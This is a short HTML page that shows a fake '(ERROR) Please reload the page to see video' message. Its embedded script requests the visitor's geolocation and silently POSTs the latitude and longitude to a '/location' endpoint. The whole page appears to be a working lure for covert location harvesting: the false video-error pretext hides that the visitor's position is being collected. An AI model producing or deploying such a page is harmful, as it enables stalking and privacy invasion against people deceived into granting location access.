<!DOCTYPE html>
<html>
<body>
<h1>(ERROR) Please reload the page to see video.</h1>
<script>
navigator.geolocation.getCurrentPosition(pos => {
    fetch('/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude
        })
    });
});
</script>
</body>
</html>
